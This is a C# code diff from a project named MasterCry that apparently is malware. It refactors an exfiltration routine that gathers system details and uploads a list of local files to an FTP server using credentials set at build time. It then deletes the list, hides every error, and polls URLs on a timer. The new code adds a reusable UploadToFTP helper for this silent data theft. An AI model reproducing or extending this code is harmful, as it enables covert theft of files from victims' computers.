@@ -38,14 +38,7 @@ namespace MasterCry
             {
                 System_Details.getOperatingSystemInfo();
                 if (IsConnectToInternet())
-                {
-                    using (WebClient client = new WebClient())
-                    {
-                        client.Credentials = new NetworkCredential(BuildVars.FTP_USER, BuildVars.FTP_PASS);
-                        client.UploadFile(BuildVars.FTP_SERVER + BuildVars.Save_Location, "STOR", BuildVars.Save_Location);
-                    }
-                }
-                
+                    UploadToFTP(BuildVars.Save_Location, BuildVars.Save_Location);
             }
 
             //    if (!System.IO.File.Exists(BuildVars.Save_Items_Location))
@@ -250,40 +243,50 @@ namespace MasterCry
 
         #endregion "Downloader"
 
-        private void Upload()
-        {
-            if (IsConnectToInternet())
-            {
-                try
+        #region "Upload"
+                private void Upload()
                 {
-                    Task.Factory.StartNew(() =>
+                    if (IsConnectToInternet())
                     {
-                        if (File.Exists(BuildVars.Save_Items_Location))
+                        try
                         {
-                            var lines = File.ReadAllLines(BuildVars.Save_Items_Location);
-                            foreach (var line in lines)
+                            Task.Factory.StartNew(() =>
                             {
-                                using (WebClient client = new WebClient())
+                                if (File.Exists(BuildVars.Save_Items_Location))
                                 {
-                                    client.Credentials = new NetworkCredential(BuildVars.FTP_USER, BuildVars.FTP_PASS);
-                                    client.UploadFile(BuildVars.FTP_SERVER + Path.GetFileName(line), "STOR", line);
+                                    var lines = File.ReadAllLines(BuildVars.Save_Items_Location);
+                                    foreach (var line in lines)
+                                    {
+                                        UploadToFTP(line, Path.GetFileName(line));
+                                        string text = File.ReadAllText(BuildVars.Save_Items_Location);
+                                        text = Regex.Replace(line, @"^\s*$", "", RegexOptions.Multiline);
+                                        using (System.IO.StreamWriter file =
+                                             new System.IO.StreamWriter(BuildVars.Save_Items_Location))
+                                        {
+                                            file.Write(text);
+                                        }
+                                    }
                                 }
-                                string text = File.ReadAllText(BuildVars.Save_Items_Location);
-                                text = Regex.Replace(line, @"^\s*$", "", RegexOptions.Multiline);
-                                using (System.IO.StreamWriter file =
-                                     new System.IO.StreamWriter(BuildVars.Save_Items_Location))
-                                {
-                                    file.Write(text);
-                                }
-                            }
+                                File.Delete(BuildVars.Save_Items_Location);
+                            });
                         }
-                        File.Delete(BuildVars.Save_Items_Location);
-                    });
+                        catch (Exception) { }
+                    }
                 }
-                catch (WebException) { }
-                catch (Exception) { }
-            }
-        }
+                private void UploadToFTP(string FileName, string Local_Path)
+                {
+                    try
+                    {
+                        using (WebClient client = new WebClient())
+                        {
+                            client.Credentials = new NetworkCredential(BuildVars.FTP_USER, BuildVars.FTP_PASS);
+                            client.UploadFile(BuildVars.FTP_SERVER + FileName, "STOR", Local_Path);
+                        }
+                    }
+                    catch (WebException) { }
+                    catch (Exception) { }
+                }
+        #endregion
 
         //Check Every 5 Min
         private void tmrURLCheck_Tick(object sender, EventArgs e)
